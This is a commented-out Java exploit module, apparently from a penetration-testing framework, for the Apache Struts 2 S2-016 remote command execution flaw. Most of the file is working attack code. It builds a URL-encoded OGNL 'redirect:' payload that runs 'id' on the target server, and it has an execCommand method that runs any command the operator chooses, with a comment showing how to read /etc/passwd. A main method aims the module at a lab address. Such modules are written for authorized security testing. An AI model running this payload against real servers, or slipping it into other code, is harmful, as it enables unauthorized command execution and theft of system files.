//package com.orleven.tentacle.permeate.script;
//
//import java.io.IOException;
//import java.net.URLEncoder;
//import java.util.ArrayList;
//import java.util.HashMap;
//import java.util.Map;
//import java.util.regex.Matcher;
//import java.util.regex.Pattern;
//
//import com.orleven.tentacle.core.IOC;
//import com.orleven.tentacle.helper.HTTPMessageHelper;
//import com.orleven.tentacle.permeate.info.HTTPServerInfo;
//import com.orleven.tentacle.permeate.info.ProveExistInfo;
//import com.orleven.tentacle.permeate.script.base.AbstractHTTPBase;
//
//import bsh.ParseException;
//import com.orleven.tentacle.permeate.imp.ExecCommandImp;
//import com.orleven.tentacle.permeate.imp.PrintImp;
//import com.orleven.tentacle.permeate.imp.ProveImp;
//
///**
// * Struts 2 命令执行漏洞 016
// * @author orleven
// * @date 2017年1月3日
// */
//public class Struts2JavaDeserializeRCE016 extends AbstractHTTPBase implements ProveImp,ExecCommandImp,PrintImp{
//	
//	private HTTPMessageHelper hTTPMessageHelp;
//	
//	public Struts2JavaDeserializeRCE016(){
//		setVulName("Struts 2 命令执行漏洞 016");
//		setVulNumber("暂无");
//	}
//	
//	/**
//	 * 初始化
//	 */
//	public void init(HTTPServerInfo hTTPServerInfo) {
//		hTTPMessageHelp = IOC.instance().getClassobj(HTTPMessageHelper.class);
//		setProveExistInfo(IOC.instance().getClassobj(ProveExistInfo.class));
//		setHTTPServerInfo(hTTPServerInfo);
//	}
//	
//	@Override
//	public void prove() {
//		try {
//			getHTTPServerInfo().setGetParameters(URLEncoder.encode("redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}"));
//			getHTTPServerInfo().getHttpHeaders().put("Charsert", "UTF-8");
//			getHTTPServerInfo().getHttpHeaders().put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0");
//			getHTTPServerInfo().getHttpHeaders().put("Accept", "*/*");
//			getHTTPServerInfo().getHttpHeaders().put("Accept-Encoding", "gzip, deflate");
//			hTTPMessageHelp.httpGet(getHTTPServerInfo().getTargetUrl(), getHTTPServerInfo().getHttpHeaders());
//			String result = hTTPMessageHelp.getResponseBody();		
//			getProveExistInfo().setProveFlag("id");
//			Pattern pattern = Pattern.compile(getProveExistInfo().getProveFlag());
//			Matcher matcher = pattern.matcher(result);
//			if (matcher.find() == true) {
//				//命令执行成功
//				getProveExistInfo().setIsVulnerable(1);
//				getProveExistInfo().getRetDate().add("id => " + result);
//			}else{
//				//命令执行失败
//				getProveExistInfo().getRetDate().add("Vulnerability does not exist !");
//			}
//			getProveExistInfo().getSendDate().add(getHTTPServerInfo().getTargetUrl());
//		} catch (IOException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
//	}
//
//	/**
//	 * command 的格式： 'id'或者'cat','/etc/passwd';
//	 */
//	@Override
//	public void execCommand(String command) {
//		try {
//			if(getProveExistInfo().getIsVulnerable()!=-1){
//				getHTTPServerInfo().setGetParameters(URLEncoder.encode("redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]"+command+"})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}"));
//				hTTPMessageHelp.httpGet(getHTTPServerInfo().getTargetUrl(), getHTTPServerInfo().getHttpHeaders());
//				String result = hTTPMessageHelp.getResponseBody();
//				if (result != null) {
//					// 命令正确
//					getProveExistInfo().getRetDate().add(command + " => " + result);
//				}else{
//					//命令执行失败
//					getProveExistInfo().getRetDate().add(command + " => " + "False !");
//				}
//				getProveExistInfo().getSendDate().add(getHTTPServerInfo().getTargetUrl());
//			}		
//		} catch (Exception e) {
//			e.printStackTrace();
//		}
//	}
//	
//	@Override
//	public void println() {
//		System.out.println("----------------------------------------");
//		System.out.println(getHTTPServerInfo().getip()+":"+getHTTPServerInfo().getPort());
//		System.out.println(getHTTPServerInfo().getTargetUrl());
//		for(int i=0;i<getProveExistInfo().getRetDate().size();i++){
//			System.out.println(getProveExistInfo().getRetDate().get(i));		
//		}
//	}
//
//	public static void main(String[] args) {
//		HTTPServerInfo hTTPServerInfo = IOC.instance().getHTTPServerInfo(HTTPServerInfo.class, "192.168.111.131","8080","","/S2-016/default.action");
//		Struts2JavaDeserializeRCE016 struts2JavaDeserializeRCE016 = new Struts2JavaDeserializeRCE016();
//		struts2JavaDeserializeRCE016.init(hTTPServerInfo);
//		struts2JavaDeserializeRCE016.prove();
//		struts2JavaDeserializeRCE016.println();
//		ProveExistInfo proveExistInfo = struts2JavaDeserializeRCE016.getProveExistInfo();
//	}
//}
